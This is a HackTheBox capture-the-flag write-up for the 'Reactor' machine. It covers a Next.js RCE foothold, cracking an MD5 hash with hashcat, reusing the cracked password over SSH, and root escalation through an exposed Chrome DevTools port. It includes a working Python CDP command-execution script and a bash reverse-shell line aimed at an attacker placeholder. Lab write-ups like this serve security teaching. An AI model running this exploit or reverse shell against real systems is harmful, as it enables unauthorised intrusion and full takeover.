## Welcome everyone!

Today, we will explore “*Reactor*”, an easy-level machine from HackTheBox

Without further ado, let’s get started!

![image](/HTB/Reactor/Reactor_images/1.png)

(Please ensure that you have added the following line   `reactor.htb     TARGET_IP`    to your local `/etc/hosts` file to enable **DNS resolution**)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Reactor/Reactor_images/2.png)

We can identify two exposed services:

- SSH (22)
- HTTP (3000)

We can start by inspecting the website hosted on port **3000**:

![image](/HTB/Reactor/Reactor_images/3.png)

We are greeted with a static page containing nothing very useful in itself. The “Core Monitoring System v3.2.1” doesn’t refer to a particular web application. 

However, thanks to **Wappalyzer**, we can observe that the Next.js framework is deployed. Moreover, we can identify its version, which is **15.0.3**. 



## Initial Access


With this information, we can start a vulnerability assessment by looking on the web: 

![image](/HTB/Reactor/Reactor_images/4.png)

It appears that an unauthenticated Remote Code Execution vulnerability affects Next.js versions up to and including 15.0.3. The GitHub repository hosts an exploit written in **Javascript** that allows to gain a foothold on the target system. We could download the script and execute it using a Bash payload that will be executed remotely, allowing us to catch a reverse shell and obtain our initial access.

(ensure that you have set up a **Netcat listener** via `nc -lvnp PORT` to catch the connection)

![image](/HTB/Reactor/Reactor_images/5.png)

It worked! We successfully obtained our foothold on the target machine as the user **node**.

(Note that the current shell is limited and can be upgraded using `python3 -c 'import pty; pty.spawn("/bin/bash")'` + `export TERM=xterm` to repair the `clear` utility)

 However, the user session we just compromised isn’t sufficient to claim the first user flag; it appears that we need to perform a **horizontal privilege escalation** to the user **engineer** in order to access its directory and retrieve the first flag:

![image](/HTB/Reactor/Reactor_images/6.png)



## Horizontal Privilege Escalation

Inspecting the environment variables with the `env` command, a very interesting line can be identified: a database file is exposed. Analyzing its content confirms that the file can be used along sqlite3 to navigate in various tables of information.

![image](/HTB/Reactor/Reactor_images/7.png)

Inspecting the database reveals a very interesting “user” table containing password hashes for two users, one of which belongs to the **engineer** user we identified before, this is the most valuable piece of information we have found so far. 

![image](/HTB/Reactor/Reactor_images/8.png)

Moreover, the password hashes are stored using the weak MD5 algorithm, making them vulnerable to offline password cracking, especially if weak passwords are used.

 We can copy its value and paste it into a hash.txt file before passing it to Hashcat through the following command:

`hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

![image](/HTB/Reactor/Reactor_images/9.png)

We successfully cracked the engineer’s hash, allowing us to recover the following plaintext password: **reactor1**.

Since the remaining service available on the target is SSH, we can suppose that we can assume that the password has been reused for SSH authentication by the engineer user. Let’s attempt to authenticate ourselves with these credentials:

`engineer:reactor1`

![image](/HTB/Reactor/Reactor_images/10.png)

Indeed, the password has been reused through SSH, which is a very bad security practice since it allowed us to pivot our restricted access from a simple information disclosure.

The user flag can be accessed in our current directory:

![image](/HTB/Reactor/Reactor_images/11.png)



## Vertical Privilege Escalation

We now need to escalate our current privileges to root in order to retrieve the final flag.
It is a good practice to run the `sudo -l` command to see whether the user we just compromised (generally knowing his password) can run any command with root privileges:

![image](/HTB/Reactor/Reactor_images/12.png)

But here, it appears that we can’t do this.

Inspecting cron jobs, capabilities and SUID bit binaries didn’t reveal anything conclusive either. However, after a basic local enumeration of the system, we can notice that an intriguing service is running locally on the target. This can be verified by running `ss -tunlp` to monitor listening connection on the machine:

![image](/HTB/Reactor/Reactor_images/13.png)

An internal port 9229 is listening on the target machine, making it undetectable from the attacker’s machine. Checking for a process associated to it reveals that it is owned by root:

![image](/HTB/Reactor/Reactor_images/14.png)

We can observe that **Chrome DevTools Protocol (CDP)** is exposed over port **9229**.

Since the **Chromium** process exposing CDP is running as root, code executed through its runtime inherits the privileges of that process. By abusing Node.js's `child_process` module through `Runtime.evaluate`, we can execute arbitrary system commands as **root**. We can write locally a Python script leveraging this weakness in order to execute arbitrary command over the Chrome Devtools Protocol’s console. The following `exploit.py` script has been used:

#!/usr/bin/env python3
import json, sys, urllib.request
from websocket import create_connection

HOST, PORT = "127.0.0.1", 9229
CMD = sys.argv[1] if len(sys.argv) > 1 else "COMMAND_AS_ROOT"

targets = json.load(urllib.request.urlopen(f"http://{HOST}:{PORT}/json/list"))
ws = create_connection(targets[0]["webSocketDebuggerUrl"])

expr = "require('child_process').execSync(%s).toString()" % json.dumps(CMD)
ws.send(json.dumps({
"id": 1,
"method": "Runtime.evaluate",
"params": {"expression": expr, "includeCommandLineAPI": True, "awaitPromise": True}
}))
print(json.loads(ws.recv())["result"]["result"].get("value"))

The following command can be used to verify that the console can execute properly arbitrary command as the superuser:

`python3 exploit.py “whoami”`

![image](/HTB/Reactor/Reactor_images/15.png)

Unfortunately, the target machine has missing Python modules, making the script execution impossible from the target system. But fortunately, the **Port Forwarding** make this possible by performing **SSH tunneling**. The following command can be used to access the local service from a local port, for example 1234:

`ssh -L 1234:127.0.0.1:9229 engineer@reactor.htb`

After authentication, the remote port 9229 running internally will be accessible from our own machine at the port 1234; magic.

Once it has been done, we can confirm this by accessing it from our web browser:

![image](/HTB/Reactor/Reactor_images/16.png)

It worked perfectly, allowing us to access the service from our own machine. It means that we can now execute the Python script we previously used. Since the service is now accessible from our own machine, we can install the required dependencies locally and run the exploit from there because we have full access, which make sense...

All missing dependencies can be downloaded, and the script can be executed. But remember: we port forwarded the remote service to our local port 1234, which means that we need to edit the script in order to fetch our loopback address at this port, otherwise it will not work.

Once all has been configured correctly, let’s verify if the script allows us to execute arbitrary command with **root privileges / as root**:

![image](/HTB/Reactor/Reactor_images/17.png)

We just confirmed that we can execute elevated arbitrary system commands with this script, making the privilege escalation possible. We can start a listener as we did previously in order to get a root session by executing again a Bash payload with root privileges that will connect to our listener. The following payload can be used: `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1'`

![image](/HTB/Reactor/Reactor_images/18.png)

We successfully escalated our privileges to **root**, granting full access and control over the target machine. We can now navigate in the `/root` directory in order to retrieve the final flag:

![image](/HTB/Reactor/Reactor_images/19.png)

Challenge completed!

![image](/HTB/Reactor/Reactor_images/20.png)

## Conclusion

This challenge was interesting to complete. From a basic reconnaissance phase, we identified a vulnerable **Next.js** version deployed along the web application which allowed us to execute arbitrary system commands without being authenticated because the software was outdated.

We obtained an initial access as the user node which was very restricted. After a local enumeration of the system, we identified a database file storing sensitive information, including a password hash stored using the weak MD5 algorithm, which is nowaday a bad security practice. After cracking the hash, we discovered that the recovered password was reused for SSH authentication. We successfully pivoted our access to the user **engineer,** which allowed us to retrieve the first flag. For the privilege escalation phase, we identified an internal service owned by **root**.

This service contained a DevTool console able to execute system commands, which led us to execute arbitrary elevated commands, ultimately giving us full control over the machine.

This box demonstrated how low-severity vulnerabilites chained can lead to a total compromise of a system.

**Thank you for reading!**
